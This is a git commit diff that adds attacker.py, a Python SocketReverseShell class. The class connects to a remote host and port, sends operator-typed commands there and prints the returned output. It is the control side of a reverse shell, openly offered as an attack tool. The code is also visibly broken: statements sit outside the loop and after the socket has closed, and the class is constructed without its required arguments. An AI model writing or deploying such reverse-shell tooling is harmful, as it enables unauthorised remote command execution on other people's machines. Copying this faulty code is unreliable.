1e6340cd5cf6fb5caf71c2812b4852411a50362f
JrDev <josemanuelramirezrengifo9@gmail.com>
2026-07-09 14:16:10 -0400

    Add SocketReverseShell class for remote command execution
    Implement a reverse shell using sockets to execute commands remotely.

--- attacker.py
+++ attacker.py
@@ -1,1 +1,27 @@
+import socket
 
+class SocketReverseShell:
+    def __init__(self, host, port):
+        self.HOST = host
+        self.PORT = port
+
+    def create_socket(self):
+        with socket.socket() as client_socket:
+            client_socket.connect((self.HOST, self.PORT))
+
+            while True:
+                command_send = input('Ingresa un comando (escribe "exit" para salir): ')
+
+        if command_send == "exit":
+            client_socket.sendall(command_send.encode('utf-8'))
+            client_socket.close()
+
+        client_socket.sendall(command_send.encode('utf-8'))
+        result_output_message_recv = client_socket.recv(1024)
+
+        message_decoder = result_output_message_recv.decode()
+        print(message_decoder)
+
+if __name__ == '__main__':
+    socket_object = SocketReverseShell()
+    socket_object.create_socket()
